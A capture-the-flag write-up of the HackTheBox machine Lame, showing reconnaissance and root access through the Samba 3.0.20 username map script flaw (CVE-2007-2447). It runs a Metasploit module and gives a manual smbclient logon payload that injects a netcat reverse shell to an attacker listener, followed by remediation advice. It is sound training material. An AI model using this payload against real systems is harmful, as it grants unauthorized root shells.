+++
title = "HackTheBox - Lame Writeup"
date = "2026-03-31"
description = "Exploiting Samba 3.0.20 via CVE-2007-2447 username map script injection"
tags = ["HackTheBox", "CTF", "Linux", "Samba", "CVE-2007-2447", "SMB", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Lame |
| OS | Linux (Debian) |
| Difficulty | Easy |
| Category | Retired |
| Vulnerability | CVE-2007-2447 (Samba username map script) |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN initial.txt 10.129.221.114
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

**Key observations:**
- **vsftpd 2.3.4** on port 21 — also a notorious backdoor (CVE-2011-2523), but it does not trigger on this machine
- **Samba 3.0.20** on ports 139/445 — the actual attack vector
- SSH is available as a potential post-exploitation pivot

---

## Exploit Research

### Searchsploit

```bash
searchsploit samba 3.0.20
```

```
Samba 3.0.20 < 3.0.25rc3 - 'username map script' Command Execution
```

The exploit abuses shell metacharacters passed through the MS-RPC `SamrLogon` call when the `username map script` option is configured. Any input containing backtick or `$()` syntax is executed directly by `/bin/sh` as root.

Reference: [CVE-2007-2447 — exploit-db #16320](https://www.exploit-db.com/exploits/16320)

---

## Exploitation

### Method 1 — Metasploit

```bash
msfconsole
search usermap_script
use exploit/multi/samba/usermap_script
show options
set RHOSTS 10.129.221.114
set LHOST 10.10.14.X
run
```

A root shell is returned immediately — no privilege escalation required.

### Flag Retrieval (Metasploit)

```bash
cat /home/*/user.txt
cat /root/root.txt
```

---

### Method 2 — Manual (No Metasploit)

#### Step 1: Enumerate SMB shares

```bash
smbclient -L //10.129.221.114/ -N
```

```
Sharename       Type
---------       ----
print$          Disk
tmp             Disk
opt             Disk
IPC$            IPC
ADMIN$          IPC
```

The `tmp` share allows anonymous access — this is the entry point.

#### Step 2: Start a listener

```bash
nc -lvnp 4444
```

#### Step 3: Connect and inject the payload

Connect to the `tmp` share using SMB1 (required for this old server) and trigger the vulnerability via the `logon` command.

```bash
smbclient //10.129.221.114/tmp -N --option='client min protocol=NT1'
```

Once connected, send the malicious username containing a shell command:

```bash
logon "./=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

The server executes the backtick expression as root, spawning a reverse shell to your listener.

#### Step 4: Retrieve flags

```bash
cat /home/*/user.txt
cat /root/root.txt
```

---

## Summary

| Step | Tool / Command |
|------|---------------|
| Port scan | `nmap -sC -sV` |
| Exploit search | `searchsploit samba 3.0.20` |
| Method 1 | Metasploit `usermap_script` |
| Method 2 | `smbclient` + `logon` payload + `nc` listener |
| Result | Root shell — no privesc required |

### Key Takeaways

- **CVE-2007-2447** requires no authentication and yields root immediately — a perfect example of why version control and patch management matter
- The `vsftpd 2.3.4` backdoor (CVE-2011-2523) is present but intentionally disabled on this machine — always verify, don't assume
- Forcing `client min protocol=NT1` in smbclient is a useful trick when dealing with legacy Samba servers that reject modern protocol negotiation
- The manual method demonstrates that Metasploit is not always necessary — understanding the underlying primitive (shell metacharacter injection) is more valuable

### Remediation

- Upgrade Samba to 3.0.25rc3 or later
- Never enable `username map script` in `smb.conf` unless strictly required, and sanitize all inputs if it must be used
- Restrict SMB access (ports 139/445) at the network perimeter
- Replace vsftpd 2.3.4 with a patched version to eliminate the co-located backdoor risk

---
